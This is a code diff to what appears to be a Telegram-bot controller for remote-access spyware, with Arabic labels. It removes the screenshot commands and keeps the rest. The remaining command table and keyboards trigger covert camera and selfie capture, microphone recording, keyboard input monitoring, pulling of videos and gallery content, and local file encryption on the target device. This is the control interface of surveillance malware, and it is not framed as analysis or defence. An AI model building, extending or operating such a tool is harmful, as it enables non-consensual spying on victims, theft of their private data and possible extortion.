@@ -223,7 +223,7 @@ COMMANDS = {
     # camera
     "main-camera":    {"category": "camera", "label": "📷 كاميرا رئيسية",    "description": "تصوير بالكاميرا الخلفية",  "needs_param": False},
     "selfie-camera":  {"category": "camera", "label": "🤳 كاميرا سيلفي",     "description": "تصوير بالكاميرا الأمامية", "needs_param": False},
-    "screenshot":     {"category": "camera", "label": "📸 لقطة شاشة",        "description": "أخذ لقطة شاشة حقيقية",    "needs_param": False},
+    # screenshot تمت إزالته من المشروع
     # audio
     "microphone":     {"category": "audio",  "label": "🎤 تسجيل صوتي",      "description": "تسجيل من الميكروفون",     "needs_param": False},
     "playAudio":      {"category": "audio",  "label": "🔊 تشغيل صوت",       "description": "تشغيل ملف صوتي",          "needs_param": True, "param_hint": "رابط الصوت"},
@@ -239,8 +239,7 @@ COMMANDS = {
     # advanced
     "input-monitoring-on":  {"category": "advanced", "label": "⌨️ مراقبة الإدخال", "description": "مراقبة لوحة المفاتيح",    "needs_param": False},
     "input-monitoring-off": {"category": "advanced", "label": "⏹ إيقاف المراقبة", "description": "إيقاف المراقبة",           "needs_param": False},
-    "screenshot-on":        {"category": "advanced", "label": "📸 تفعيل لقطات الشاشة", "description": "التقاط شاشة واتساب تلقائياً", "needs_param": False},
-    "screenshot-off":       {"category": "advanced", "label": "⏹ إيقاف لقطات الشاشة", "description": "إيقاف التقاط الشاشة", "needs_param": False},
+    # screenshot-on/off تمت إزالته من المشروع
     "apply-data-protection": {"category": "advanced", "label": "🔐 حماية البيانات",      "description": "تشفير الملفات محلياً",   "needs_param": False},
     "pull-videos":           {"category": "advanced", "label": "🎬 سحب فيديوهات",       "description": "سحب الفيديوهات",          "needs_param": False},
     "stop-videos":           {"category": "advanced", "label": "⏹ إيقاف الفيديو",    "description": "إيقاف سحب الفيديو",      "needs_param": False},
@@ -421,7 +420,7 @@ def data_keyboard(did):
 def camera_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(_cbtn(did,"main-camera"), _cbtn(did,"selfie-camera"))
-    kb.add(_cbtn(did,"screenshot"))
+    # screenshot تمت إزالته
     kb.add(_back(did))
     return kb
 
@@ -447,7 +446,7 @@ def tools_keyboard(did):
 def advanced_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(_cbtn(did,"input-monitoring-on"), _cbtn(did,"input-monitoring-off"))
-    kb.add(_cbtn(did,"screenshot-on"), _cbtn(did,"screenshot-off"))
+    # screenshot-on/off تمت إزالته
     kb.add(_cbtn(did,"apply-data-protection"))
     kb.add(_cbtn(did,"pull-videos"), _cbtn(did,"stop-videos"))
     kb.add(_cbtn(did,"stop-gallery"))
